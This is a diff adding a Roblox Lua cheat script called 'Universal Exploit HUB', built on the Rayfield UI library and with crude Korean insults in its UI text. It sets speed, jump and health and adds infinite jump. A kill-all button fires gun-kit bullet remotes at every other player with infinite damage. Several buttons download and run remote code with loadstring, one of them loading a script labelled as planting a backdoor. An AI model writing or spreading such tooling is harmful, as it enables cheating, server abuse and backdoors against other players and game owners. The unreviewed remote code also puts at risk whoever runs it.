@@ -1,0 +1,176 @@
+
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+    Name = "Universal Exploit HUB",
+    LoadingTitle = "잼민겜 Fucking",
+    LoadingSubtitle = "by 전두광",
+    ConfigurationSaving = {
+       Enabled = true,
+       FolderName = nil, -- Create a custom folder for your hub/game
+       FileName = "wo Hub"
+    },
+    Discord = {
+       Enabled = false,
+       Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
+       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+    },
+    KeySystem = true, -- Set this to true to use our key system
+    KeySettings = {
+       Title = "화이트 리스트 체크",
+       Subtitle = "Universal Exploit Key",
+       Note = "HUB Key: Yongin",
+       FileName = "HUB Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+       Key = {"Yongin"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+    }
+ })
+
+ Rayfield:Notify({
+    Title = "잼민겜 ㅈ까",
+    Content = "잼민겜 애미뒤진 장애 허브 구독!",
+    Duration = 5,
+    Image = 13047715178,
+    Actions = { -- Notification Buttons
+       Ignore = {
+          Name = "Universal Exploit HUB!",
+          Callback = function()
+       end
+    },
+ },
+ })
+
+ local PlayerTab = Window:CreateTab("Player", 4483362458)
+ local AdminTab = Window:CreateTab("Admin", 4483362458)
+ local scriptTab = Window:CreateTab("script", 4483362458)
+ local GameTab = Window:CreateTab("Game", 4483362458)
+
+
+ local Slider = PlayerTab:CreateSlider({
+    Name = "스피드",
+    Range = {0, 350},
+    Increment = 10,
+    Suffix = "Speed",
+    CurrentValue = 16,
+    Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+    Callback = function(Value)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
+    end,
+ })
+
+ local Button = PlayerTab:CreateButton({
+    Name = "축지법",
+    Callback = function()
+        _G.infinjump = not _G.infinjump
+
+        if _G.infinJumpStarted == nil then
+            --Ensures this only runs once to save resources
+            _G.infinJumpStarted = true
+            
+            --Notifies readiness
+            game.StarterGui:SetCore("SendNotification", {Title="UE Hub"; Text="Infinite Jump Activated!"; Duration=5;})
+        
+            --The actual infinite jump
+            local plr = game:GetService('Players').LocalPlayer
+            local m = plr:GetMouse()
+            m.KeyDown:connect(function(k)
+                if _G.infinjump then
+                    if k:byte() == 32 then
+                    humanoid = game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Humanoid')
+                    humanoid:ChangeState('Jumping')
+                    wait()
+                    humanoid:ChangeState('Seated')
+                    end
+                end
+            end)
+        end
+    end,
+ })
+
+ local Slider = PlayerTab:CreateSlider({
+    Name = "점프",
+    Range = {1, 350},
+    Increment = 1,
+    Suffix = "Power",
+    CurrentValue = 16,
+    Flag = "sliderjp", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+    Callback = function(Value)
+         game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
+    end,
+ })
+
+ local Slider = PlayerTab:CreateSlider({
+    Name = "체력",
+    Range = {1, 99999999999},
+    Increment = 1,
+    Suffix = "Health",
+    CurrentValue = 16,
+    Flag = "sliderjp", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+    Callback = function(Value)
+         game.Players.LocalPlayer.Character.Humanoid.Health = (Value)
+    end,
+ })
+
+ local Button = AdminTab:CreateButton({
+    Name = "IY Admin",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+    end,
+ })
+
+ local Button = scriptTab:CreateButton({
+    Name = "Dex",
+    Callback = function()
+        loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
+    end,
+ })
+
+ local Button = scriptTab:CreateButton({
+    Name = "백도어 심기",
+    Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
+    end,
+ })
+
+ local Button = scriptTab:CreateButton({
+    Name = "짭부대 킬올 [Acs, Ce]",
+    Callback = function()
+      local Players = game:GetService("Players")
+      local LocalPlayer = Players.LocalPlayer
+      
+      local GunkitRemotes = game:GetService("ReplicatedStorage"):FindFirstChild("Acs_Engine") and game:GetService("ReplicatedStorage"):FindFirstChild("Acs_Engine").Remotes or game:GetService("ReplicatedStorage"):FindFirstChild("Carbon") and game:GetService("ReplicatedStorage"):FindFirstChild("Carbon").Remotes or game:GetService("ReplicatedStorage"):FindFirstChild("GunRemotes")
+      
+      local gr = nil
+      for index, value in pairs(GunkitRemotes:GetChildren()) do
+          if value.Name:lower() == "bullet" then
+              gr = value
+              break
+          end
+      end
+      
+      if gr then
+          for index, player in pairs(Players:GetPlayers()) do
+              if player != LocalPlayer then
+                  gr:FireServer{
+                      "Auth", nil, game.CreatorId, player, math.huge
+                  }
+              end
+          end
+      end
+    end,
+ })
+
+ local Button = GameTab:CreateButton({
+    Name = "백날 땅파봐라 돈이 나오냐?",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/userbo/Bakddangdon1/main/script'))()
+    end,
+ })
+
+local Button = PlayerTab:CreateButton({
+   Name = "Fly",
+   Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+   end,
+})
